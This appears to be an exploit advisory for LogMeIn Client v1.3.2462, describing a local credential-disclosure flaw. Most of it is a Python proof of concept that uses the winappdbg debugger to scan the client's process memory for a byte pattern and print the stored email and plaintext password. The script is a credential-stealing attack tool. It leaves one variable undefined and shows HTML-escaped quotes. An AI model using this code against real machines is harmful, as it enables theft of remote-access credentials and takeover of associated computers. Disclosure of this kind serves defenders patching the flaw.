#####
# LogMeIn Client v1.3.2462 is vulnerable to local credentials disclosure, the supplied username and password are stored in a plaintext format in memory process.
# A potential attacker could reveal the supplied username and password in order to gain access to account and associated computers.
#####
# Proof-Of-Concept Code:
 
import time
import urllib
from winappdbg import Debug, Process
 
username    = &#039;&#039;
password    = &#039;&#039;
found       = 0

memory_dump = []
 
debug = Debug()
try:
    print "[~] Searching for pid by process name &#039;%s&#039;.." % (filename)
    time.sleep(1)
    debug.system.scan_processes()
    for (process, process_name) in debug.system.find_processes_by_filename(filename):
        process_pid = process.get_pid()
    if process_pid is not 0:
        print "[+] Found process with pid #%d" % (process_pid)
        time.sleep(1)
        print "[~] Trying to read memory for pid #%d" % (process_pid)
         
        process = Process(process_pid)
        for address in process.search_bytes(&#039;\x26\x5F\x5F\x56\x49\x45\x57\x53\x54\x41\x54\x45\x3D&#039;):
            memory_dump.append(process.read(address,150))
        for i in range(len(memory_dump[0])):
            email_addr  = memory_dump[i].split(&#039;email=&#039;)[1]
            tmp_passwd  = memory_dump[i].split(&#039;password=&#039;)[1]
            username    = email_addr.split(&#039;&hiddenEmail=&#039;)[0]
            password    = tmp_passwd.split(&#039;&rememberMe=&#039;)[0]
            if username != &#039;&#039; and password !=&#039;&#039;:
                found = 1
                print "[+] Credentials found!\r\n----------------------------------------"
                print "[+] Username: %s" % urllib.unquote_plus(username)
                print "[+] Password: %s" % password
                break
        if found == 0:
            print "[-] Credentials not found! Make sure the client is connected."
    else:
        print "[-] No process found with name &#039;%s&#039;." % (filename)
     
    debug.loop()
finally:
    debug.stop()
